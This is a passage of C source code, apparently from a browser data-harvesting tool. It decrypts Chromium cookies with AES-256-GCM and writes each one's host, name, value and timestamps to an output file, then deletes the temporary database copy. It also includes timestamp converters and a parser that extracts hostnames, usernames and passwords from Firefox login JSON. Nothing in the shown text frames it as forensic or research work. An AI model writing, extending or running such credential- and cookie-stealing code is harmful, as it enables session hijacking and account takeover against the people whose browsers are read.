            // Check the version that Chromium based browsers use to keep track of the way the data is encrypted.
            // Based on my research, only in version v20 there is a huge difference and it has not been explained, figured out, neither documented.
            char version[4];
            strncpy(version, cookie_blob_data, 3);
            version[3] = '\0'; 
            if (strcmp(version, "v20") == 0) {
                continue;
            }

            // Decrypt the cookie if it's not v20.
            AES_256_GCM_Setup(key, cookie_blob_data, lenenccookie, cookie);
            fprintf(output, "===============================================================\nHost: %s\nCookie Name: %s\nCookie Value: %s\nCreation time: %s\nLast access datetime: %s\nExpires datetime: %s\n===============================================================\n\n", sqlite3_column_text(stmt, 1), sqlite3_column_text(stmt, 2), cookie, chrome_timestamp_to_string(sqlite3_column_text(stmt, 0)), chrome_timestamp_to_string(sqlite3_column_text(stmt, 5)), chrome_timestamp_to_string(sqlite3_column_text(stmt, 4)));
        }
    }
    fclose(output);
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    INFO("Removing temp DB file %s...", logindata);
    unlink(logindata);
    return 0;
}
int is_leap_year(int year) {
    return (year % 4 == 0 && (year % 100 != 0 || year % 400 == 0));
}
char *chrome_timestamp_to_string(const char *chrome_timestamp_str) {
    static char result[20];
    long long chrome_timestamp = atoll(chrome_timestamp_str);
    int days_in_month[] = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
    time_t seconds = (chrome_timestamp / 1000000) - WINDOWS_TO_UNIX_EPOCH_DIFF;
    int year = 1970;
    int month = 0;
    int day = 0;
    int hour = 0;
    int minute = 0;
    int second = 0;
    while (seconds >= (is_leap_year(year) ? 366 : 365) * SECONDS_IN_A_DAY) { seconds -= (is_leap_year(year) ? 366 : 365) * SECONDS_IN_A_DAY; year++; }
    if (is_leap_year(year)) { days_in_month[1] = 29; } else { days_in_month[1] = 28; }
    for (month = 0; month < 12; month++) { if (seconds < days_in_month[month] * SECONDS_IN_A_DAY) { break; } seconds -= days_in_month[month] * SECONDS_IN_A_DAY; }
    day = seconds / SECONDS_IN_A_DAY + 1;
    seconds %= SECONDS_IN_A_DAY;
    hour = seconds / SECONDS_IN_AN_HOUR;
    seconds %= SECONDS_IN_AN_HOUR;
    minute = seconds / SECONDS_IN_A_MINUTE;
    second = seconds % SECONDS_IN_A_MINUTE;
    snprintf(result, sizeof(result), "%04d-%02d-%02d %02d:%02d:%02d", year, month + 1, day, hour, minute, second);
    return result;
}
char *firefox_timestamp_to_string(const char *firefox_timestamp_str) {
    static char result[30];
    long long firefox_timestamp = atoll(firefox_timestamp_str);
    long long seconds = firefox_timestamp / 1000000;
    if (seconds < 0) { snprintf(result, sizeof(result), "Invalid Timestamp"); return result; }
    int year = 1970;
    int month = 0;
    long long day = 0;
    while (seconds >= (is_leap_year(year) ? 366 : 365) * SECONDS_IN_A_DAY) { seconds -= (is_leap_year(year) ? 366 : 365) * SECONDS_IN_A_DAY; year++; }
    int days_in_month[] = {31, is_leap_year(year) ? 29 : 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
    for (month = 0; month < 12; month++) { if (seconds < days_in_month[month] * SECONDS_IN_A_DAY) {  break; } seconds -= days_in_month[month] * SECONDS_IN_A_DAY; }
    day = seconds / SECONDS_IN_A_DAY + 1;
    seconds %= SECONDS_IN_A_DAY;
    int hour = seconds / SECONDS_IN_AN_HOUR;
    seconds %= SECONDS_IN_AN_HOUR;
    int minute = seconds / SECONDS_IN_A_MINUTE;
    int second = seconds % SECONDS_IN_A_MINUTE;
    snprintf(result, sizeof(result), "%04d-%02d-%02d %02d:%02d:%02d", year, month + 1, day, hour, minute, second);
    return result;
}
int ManualGeckoRegex(char *jsonload, char *hostname, char *username, char *password) {
    // Find hostname
    char *pHostname = strstr(jsonload, "hostname");
    size_t IndexHostname = (pHostname - jsonload) + (strlen("hostname") + 3);
    memmove(jsonload, jsonload + IndexHostname, strlen(jsonload + IndexHostname) + 1);
    char *pHostname2 = strstr(jsonload, "\"");
    size_t IndexHostname2 = (pHostname2 - jsonload);

    // Copy the hostname to the corresponding variable.
    strncpy(hostname, jsonload, IndexHostname2);
    hostname[IndexHostname2] = '\0';

    // --------------------------------------------------------

    // Find Username
    char *pUsername = strstr(jsonload, "Username");
    size_t IndexUsername = (pUsername - jsonload) + (strlen("Username") + 3);
    memmove(jsonload, jsonload + IndexUsername, strlen(jsonload + IndexUsername) + 1);
    char *pUsername2 = strstr(jsonload, "\"");
    size_t IndexUsername2 = (pUsername2 - jsonload);

    // Copy the Username to the corresponding variable.
    strncpy(username, jsonload, IndexUsername2);
    username[IndexUsername2] = '\0';

    // --------------------------------------------------------

    // Find Password
    char *pPassword = strstr(jsonload, "Password\"");
    size_t IndexPassword = (pPassword - jsonload) + (strlen("Password\"") + 2);
    memmove(jsonload, jsonload + IndexPassword, strlen(jsonload + IndexPassword) + 1);
    char *pPassword2 = strstr(jsonload, "\"");
    size_t IndexPassword2 = (pPassword2 - jsonload);

    // Copy the Password to the corresponding variable.
    strncpy(password, jsonload, IndexPassword2);
    password[IndexPassword2] = '\0';
    return 0;
}
